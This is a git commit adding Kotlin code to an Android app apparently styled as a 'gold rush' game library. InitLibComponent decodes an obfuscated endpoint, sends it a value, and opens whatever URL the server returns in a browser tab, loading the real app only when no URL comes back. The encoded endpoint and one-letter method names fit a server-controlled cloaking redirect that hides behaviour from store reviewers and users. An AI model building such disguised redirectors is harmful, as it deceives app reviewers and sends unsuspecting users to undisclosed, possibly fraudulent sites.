7e2e4be4fde330cef84c67a52f99244e502a4260
Андрей Николаенко <andriy.nikolaenko1012@gmail.com>
2020-08-21 16:05:27 +0300

    First commit

---
+++ app/src/main/java/com/luckyminer/goldrushlib/InitLibComponent.kt
@@ -0,0 +1,43 @@
+package com.luckyminer.goldrushlib
+
+import android.app.Activity
+import android.content.Intent
+import android.net.Uri
+import androidx.browser.customtabs.CustomTabsIntent
+import com.google.gson.Gson
+import java.net.URL
+import java.util.concurrent.Executors
+
+class InitLibComponent(private var firstActivity: Activity, private var secondActivity: Activity, private var content: String?) {
+    fun init(s: String){
+        if(InternetConnection.checkConnection(firstActivity)){
+            if (content != null){
+                Executors.newSingleThreadExecutor().execute{
+                    val json = URL("${Utils().decodeString(s)}?$content").readText()
+                    val convertedObject = Gson().fromJson(json, MyResponse::class.java)
+                    if (convertedObject.data != null){
+                        s(convertedObject.data!!)
+                    } else {
+                        finish()
+                    }
+                }
+            } else {
+                finish()
+            }
+        } else {
+            finish()
+        }
+    }
+
+    private fun finish(){
+        firstActivity.startActivity(Intent(firstActivity, secondActivity::class.java))
+        firstActivity.finish()
+    }
+
+    private fun s(z: String){
+        val builder = CustomTabsIntent.Builder()
+        val customTabsIntent = builder.build()
+        customTabsIntent.launchUrl(firstActivity, Uri.parse(z))
+        firstActivity.finish()
+    }
+}
---
+++ app/src/main/java/com/luckyminer/goldrushlib/MyResponse.kt
@@ -0,0 +1,8 @@
+package com.luckyminer.goldrushlib
+
+import com.google.gson.annotations.SerializedName
+
+class MyResponse {
+    @SerializedName("data")
+    var data: String? = null
+}
